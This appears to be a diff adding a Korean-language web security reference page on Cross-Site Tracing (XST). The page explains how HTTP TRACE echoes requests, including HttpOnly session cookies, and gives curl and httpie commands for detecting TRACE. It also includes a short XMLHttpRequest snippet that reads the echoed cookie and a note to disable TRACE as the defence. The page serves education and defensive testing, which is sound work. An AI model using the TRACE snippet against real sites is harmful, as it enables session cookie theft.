@@ -1,0 +1,93 @@
+<!doctype html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>XST — PIXN</title>
+  <meta name="description" content="XST — Vulnerabilities, attack surfaces, and defensive verification notes.">
+  <meta property="og:title" content="XST — PIXN"><meta property="og:description" content="XST — Vulnerabilities, attack surfaces, and defensive verification notes."><meta property="og:image" content="https://whgusals84.github.io/pixn-security/og.png"><meta name="twitter:card" content="summary_large_image">
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+  <header data-site-header data-active="reference"></header>
+  <main class="page article-page" id="main">
+    <header class="article-heading">
+      <p class="eyebrow"><a href="/reference/">Reference</a> / <a href="/reference/attack/">Web Security</a></p>
+      <h1>XST</h1>
+      <time datetime="2021-10-08">OCTOBER 8, 2021</time>
+    </header>
+    <article class="article-body"><h2 id="introduction">Introduction</h2>
+<p>XST(Cross-Site Tracing)는 HTTP TRACE Method를 이용한 공격 방법입니다. 이를 통해서 HttpOnly 등으로 보호된 세션쿠키를 탈취하는데 사용할 수 있습니다.</p>
+<h3 id="trace-method">TRACE Method</h3>
+<p>TRACE Method는 테스트를 위한 HTTP Method 중 하나로 HTTP Request를 그대로 Response에 포함해서 전달하는 기능을 가지고 있습니다. 마치 Echo 서비스와 비슷합니다.</p>
+<pre><code>TRACE / HTTP.1.1
+TestHeader: 1234
+Cookie: abcd=1234;
+</code></pre>
+<pre><code>HTTP/1.1 200 OK
+Connection: Keep-Alive
+...
+
+TRACE / HTTP.1.1
+TestHeader: 1234
+Cookie: abcd=1234;
+</code></pre>
+<h3 id="httponly">HttpOnly</h3>
+<p>Cookie 속성 중 HttpOnly가 적용된 쿠키는 Javascript에서 접근하지 못하도록 제한하고 있습니다. 일반적으로 세션 쿠키와 같이 중요한 쿠키는 HttpOnly 속성을 주어 XSS 등의 공격을 통해 Javascript를 이용하여 쿠키에 접근하는 것을 차단하기 떄문에 세션 쿠키를 보호하는데 좋은 방법 중 하나입니다.</p>
+<pre><code>Set-Cookie: session=1231421512515; httponly;
+</code></pre>
+<h3 id="xss-trace-leak-cookie">XSS + TRACE = Leak Cookie</h3>
+<p>session이란 쿠키가 만약 httponly 속성이라면 javascript에서 접근 시 해당 쿠키가 노출되지 않습니다.</p>
+<pre><code class="language-javascript hljs">consoel<span class="hljs-punctuation">.</span>log<span class="hljs-punctuation">(</span><span class="hljs-built_in">document</span><span class="hljs-punctuation">.</span>cookie<span class="hljs-punctuation">)</span>
+</code></pre>
+<p>일반적인 경우라면 cookie를 탈취할 수 없지만, 서비스에 TRACE Method가 허용된 경우 TRACE Method로 웹 요청을 발생시키면, HTTP Request에는 Cookie가 전달되기 때문에 sessionid 쿠키가 전송됩니다. 이 때 TRACE는 Response에 Request 정보를 포함하기 때문에 Response에 sessionid 쿠키 정보가 포함되어 전달됩니다.</p>
+<pre><code>TRACE /testpage HTTP.1.1
+TestHeader: 1234
+Cookie: sessionid=1123142124234;
+</code></pre>
+<pre><code>HTTP/1.1 200 OK
+Connection: Keep-Alive
+...
+
+TRACE /testpage HTTP.1.1
+TestHeader: 1234
+Cookie: sessionid=1123142124234;
+</code></pre>
+<p>결국 공격자는 Response handling을 하여 response 내 sessionid 쿠키 값을 얻을 수 있습니다.</p>
+<h2 id="offensive-techniques">Offensive techniques</h2>
+<h3 id="detect">Detect</h3>
+<p>서비스에서 TRACE 메소드를 허용하는 페이지를 확인하면 됩니다. ZAP/BurpSuite에서 Method 부분을 TRACE로 변경하여 전송하거나 curl, httpie 등의 cli 도구에서 method를 지정해 전송하는 형태로 체크할 수 있습니다.</p>
+<pre><code>[ curl ]
+curl -i -k -X TRACE https://target.service
+
+[ httpie ]
+http TRACE https://target.service
+</code></pre>
+<h3 id="exploitation">Exploitation</h3>
+<p><strong>XMLHttpRequet</strong></p>
+<pre><code class="language-javascript hljs">xmlHTTP <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> XMLHttpRequest<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+xmlHTTP<span class="hljs-punctuation">.</span>open<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;TRACE&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;https://target.service&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-literal">false</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+	xmlHTTP<span class="hljs-punctuation">.</span>onreadystatechange <span class="hljs-operator">=</span> <span class="hljs-keyword">function</span> <span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">{</span>
+		<span class="hljs-keyword">if</span> <span class="hljs-punctuation">(</span>xmlHTTP<span class="hljs-punctuation">.</span>readyState <span class="hljs-operator">==</span> <span class="hljs-number">4</span> <span class="hljs-operator">&amp;&amp;</span> xmlHTTP<span class="hljs-punctuation">.</span>status <span class="hljs-operator">==</span> <span class="hljs-number">200</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">{</span>
+			alert<span class="hljs-punctuation">(</span>xmlHTTP<span class="hljs-punctuation">.</span>response<span class="hljs-punctuation">)</span>
+		<span class="hljs-punctuation">}</span>
+	<span class="hljs-punctuation">}</span>
+xmlHTTP<span class="hljs-punctuation">.</span>send<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+</code></pre>
+<h2 id="defensive-techniques">Defensive techniques</h2>
+<p>TRACE Method를 비 활성화하면 됩니다.</p>
+<h2 id="tools">Tools</h2>
+<ul>
+<li><a href="https://github.com/projectdiscovery/nuclei-templates/blob/master/miscellaneous/trace-method.yaml">nuclei template 내 trace</a></li>
+<li><a href="https://www.zaproxy.org/docs/alerts/90028/">https://www.zaproxy.org/docs/alerts/90028/</a></li>
+</ul>
+<h2 id="references">References</h2>
+<ul>
+<li>https://owasp.org/www-community/attacks/Cross_Site_Tracing</li>
+</ul></article>
+    <footer class="article-source"><span>Republished with permission</span><a href="https://www.hahwul.com/cullinan/attack/xst/" rel="noopener noreferrer">Original source ↗</a></footer>
+  </main>
+  <footer data-site-footer></footer><script src="/assets/site.js"></script>
+</body>
+</html>
